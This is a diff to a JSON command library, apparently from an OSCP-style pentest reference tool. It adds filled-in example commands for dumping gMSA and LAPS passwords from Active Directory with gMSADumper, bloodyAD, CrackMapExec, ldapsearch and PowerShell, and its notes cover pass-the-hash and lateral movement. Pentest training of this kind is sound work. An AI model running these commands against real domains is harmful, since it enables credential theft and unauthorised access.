@@ -8,28 +8,62 @@
       "category": "post-exploit",
       "subcategory": "credential-dumping",
       "variables": [
-        {"name": "<USERNAME>", "description": "User with gMSA read access", "example": "user", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "User with gMSA read access",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "GMSA", "CREDENTIAL_DUMPING", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GMSA",
+        "CREDENTIAL_DUMPING",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-u": "Username with ReadGMSAPassword rights",
         "-p": "Password for authentication",
         "-d": "Domain name (FQDN)",
         "-dc-ip": "Domain controller IP (optional)"
       },
-      "success_indicators": ["Password:", "NTLM:", "gMSA"],
-      "failure_indicators": ["Access denied", "No gMSA found", "Cannot read password"],
-      "next_steps": ["evil-winrm-shell", "psexec-shell"],
-      "alternatives": ["bloodyad-gmsa"],
+      "success_indicators": [
+        "Password:",
+        "NTLM:",
+        "gMSA"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "No gMSA found",
+        "Cannot read password"
+      ],
+      "next_steps": [
+        "evil-winrm-shell",
+        "psexec-shell"
+      ],
+      "alternatives": [
+        "bloodyad-gmsa"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "Access denied": "User lacks msDS-GroupMSAMembership read rights",
         "No gMSA found": "No gMSA accounts configured in domain"
       },
       "notes": "GROUP MANAGED SERVICE ACCOUNTS (gMSA):\nAutomatically rotating passwords managed by AD.\n\nWHO CAN READ:\nOnly principals in msDS-GroupMSAMembership attribute.\nBloodHound: ReadGMSAPassword edge shows who can read.\n\nUSE CASES:\n- Service accounts configured as gMSA\n- Often over-privileged (DA membership, admin on servers)\n\nOUTPUT:\nReturns cleartext password and NT hash.\nUse hash with pass-the-hash or password with normal auth.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "python3 gMSADumper.py -u 'user' -p 'P@ssw0rd123!' -d 'corp.local'"
     },
     {
       "id": "bloodyad-gmsa",
@@ -39,13 +73,43 @@
       "category": "post-exploit",
       "subcategory": "credential-dumping",
       "variables": [
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<USERNAME>", "description": "User with gMSA read access", "example": "user", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<DC_IP>", "description": "Domain controller IP", "example": "192.168.50.70", "required": true},
-        {"name": "<GMSA_ACCOUNT>", "description": "gMSA account name", "example": "svc_gmsa", "required": true}
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "User with gMSA read access",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<GMSA_ACCOUNT>",
+          "description": "gMSA account name",
+          "example": "svc_gmsa",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "GMSA", "BLOODYAD", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GMSA",
+        "BLOODYAD",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-d": "Domain name",
         "-u": "Username",
@@ -54,16 +118,27 @@
         "get object": "Read AD object attributes",
         "--attr": "Specific attribute to read"
       },
-      "success_indicators": ["msDS-ManagedPassword", "NTLM:"],
-      "failure_indicators": ["Access denied", "Object not found"],
-      "next_steps": ["evil-winrm-shell"],
-      "alternatives": ["gmsadumper"],
+      "success_indicators": [
+        "msDS-ManagedPassword",
+        "NTLM:"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "Object not found"
+      ],
+      "next_steps": [
+        "evil-winrm-shell"
+      ],
+      "alternatives": [
+        "gmsadumper"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "Access denied": "User cannot read gMSA password"
       },
       "notes": "Alternative to gMSADumper using BloodyAD.\n\nREQUIRES:\n- Principal must be in msDS-GroupMSAMembership of the gMSA\n\nFIND gMSA ACCOUNTS:\nbloodyAD get writable --otype msDS-GroupManagedServiceAccount",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "bloodyAD -d 'corp.local' -u 'user' -p 'P@ssw0rd123!' --host '192.168.50.70' get object 'svc_gmsa$' --attr msDS-ManagedPassword"
     },
     {
       "id": "laps-password-cme",
@@ -73,27 +148,64 @@
       "category": "post-exploit",
       "subcategory": "credential-dumping",
       "variables": [
-        {"name": "<TARGET>", "description": "Target computer or range", "example": "192.168.50.0/24", "required": true},
-        {"name": "<USERNAME>", "description": "User with LAPS read rights", "example": "user", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true}
+        {
+          "name": "<TARGET>",
+          "description": "Target computer or range",
+          "example": "192.168.50.0/24",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "User with LAPS read rights",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "LAPS", "CRACKMAPEXEC", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "LAPS",
+        "CRACKMAPEXEC",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "--laps": "Retrieve LAPS password for computers",
         "--laps-password": "Use LAPS password for authentication (after retrieval)"
       },
-      "success_indicators": ["Password:", "LAPS"],
-      "failure_indicators": ["No LAPS password found", "Access denied"],
-      "next_steps": ["psexec-shell", "evil-winrm-shell"],
-      "alternatives": ["laps-password-ldapsearch"],
+      "success_indicators": [
+        "Password:",
+        "LAPS"
+      ],
+      "failure_indicators": [
+        "No LAPS password found",
+        "Access denied"
+      ],
+      "next_steps": [
+        "psexec-shell",
+        "evil-winrm-shell"
+      ],
+      "alternatives": [
+        "laps-password-ldapsearch"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "No LAPS password found": "LAPS not configured or user lacks read rights",
         "Access denied": "User cannot read ms-MCS-AdmPwd attribute"
       },
       "notes": "LAPS (LOCAL ADMINISTRATOR PASSWORD SOLUTION):\nStores local admin password in AD attribute ms-MCS-AdmPwd.\n\nWHO CAN READ:\nBy default: Domain Admins, delegated groups\nBloodHound: ReadLAPSPassword edge\n\nUSE CASES:\n- Read password for local admin on workstations\n- Lateral movement without domain creds\n\nLAPS v2 (Windows LAPS):\nNew attribute: msLAPS-Password\nSupports password encryption\nUse --laps-password to auto-auth with retrieved password",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "crackmapexec smb 192.168.50.0/24 -u 'user' -p 'P@ssw0rd123!' -d 'corp.local' --laps"
     },
     {
       "id": "laps-password-ldapsearch",
@@ -103,15 +215,55 @@
       "category": "post-exploit",
       "subcategory": "credential-dumping",
       "variables": [
-        {"name": "<DC_IP>", "description": "Domain controller IP", "example": "192.168.50.70", "required": true},
-        {"name": "<USERNAME>", "description": "Username with LAPS read rights", "example": "user", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<DC1>", "description": "First DC component", "example": "corp", "required": true},
-        {"name": "<DC2>", "description": "Second DC component", "example": "local", "required": true},
-        {"name": "<COMPUTER_NAME>", "description": "Computer name to query", "example": "WS01", "required": true}
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "Username with LAPS read rights",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<DC1>",
+          "description": "First DC component",
+          "example": "corp",
+          "required": true
+        },
+        {
+          "name": "<DC2>",
+          "description": "Second DC component",
+          "example": "local",
+          "required": true
+        },
+        {
+          "name": "<COMPUTER_NAME>",
+          "description": "Computer name to query",
+          "example": "WS01",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "LAPS", "LDAP", "LINUX", "OSCP:MEDIUM"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "LAPS",
+        "LDAP",
+        "LINUX",
+        "OSCP:MEDIUM"
+      ],
       "flag_explanations": {
         "-x": "Simple authentication (not SASL)",
         "-H": "LDAP server URI",
@@ -120,17 +272,27 @@
         "-b": "Search base DN",
         "ms-MCS-AdmPwd": "LAPS password attribute"
       },
-      "success_indicators": ["ms-MCS-AdmPwd:"],
-      "failure_indicators": ["No such object", "Invalid credentials"],
-      "next_steps": ["psexec-shell"],
-      "alternatives": ["laps-password-cme"],
+      "success_indicators": [
+        "ms-MCS-AdmPwd:"
+      ],
+      "failure_indicators": [
+        "No such object",
+        "Invalid credentials"
+      ],
+      "next_steps": [
+        "psexec-shell"
+      ],
+      "alternatives": [
+        "laps-password-cme"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "No such object": "Computer not found - check name spelling",
         "Invalid credentials": "Check username format and password"
       },
       "notes": "MANUAL LAPS READ:\nUseful when CrackMapExec not available.\n\nFOR LAPS v2 (Windows LAPS):\nUse attribute: msLAPS-Password\n\nLIST ALL LAPS PASSWORDS:\nldapsearch -x -H ldap://<DC_IP> -D 'user@domain' -w 'pass' -b 'dc=corp,dc=local' '(ms-MCS-AdmPwd=*)' name ms-MCS-AdmPwd",
-      "oscp_relevance": "medium"
+      "oscp_relevance": "medium",
+      "filled_example": "ldapsearch -x -H ldap://192.168.50.70 -D 'user@corp.local' -w 'P@ssw0rd123!' -b 'dc=corp,dc=local' '(name=WS01)' ms-MCS-AdmPwd"
     },
     {
       "id": "powerview-gmsa",
@@ -140,25 +302,44 @@
       "category": "post-exploit",
       "subcategory": "credential-dumping",
       "variables": [
-        {"name": "<GMSA_ACCOUNT>", "description": "gMSA account name", "example": "svc_gmsa", "required": true}
+        {
+          "name": "<GMSA_ACCOUNT>",
+          "description": "gMSA account name",
+          "example": "svc_gmsa",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "GMSA", "POWERSHELL", "WINDOWS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "GMSA",
+        "POWERSHELL",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "Get-ADServiceAccount": "AD module cmdlet for service accounts",
         "-Identity": "Account name",
         "-Properties": "Attributes to retrieve",
         "msDS-ManagedPassword": "gMSA password blob"
       },
-      "success_indicators": ["SecureCurrentPassword"],
-      "failure_indicators": ["Access denied", "Cannot find"],
+      "success_indicators": [
+        "SecureCurrentPassword"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "Cannot find"
+      ],
       "next_steps": [],
-      "alternatives": ["gmsadumper"],
+      "alternatives": [
+        "gmsadumper"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "Access denied": "User lacks gMSA read rights"
       },
       "notes": "WINDOWS gMSA READ:\nRequires Active Directory PowerShell module.\n\nPARSE PASSWORD:\n$blob = Get-ADServiceAccount ... | ...\n$password = ConvertFrom-ADManagedPasswordBlob $blob\n$secpassword = $password.SecureCurrentPassword\n$plaintext = [Net.NetworkCredential]::new('', $secpassword).Password",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "Get-ADServiceAccount -Identity 'svc_gmsa' -Properties 'msDS-ManagedPassword' | Select-Object -ExpandProperty 'msDS-ManagedPassword'"
     }
   ]
 }
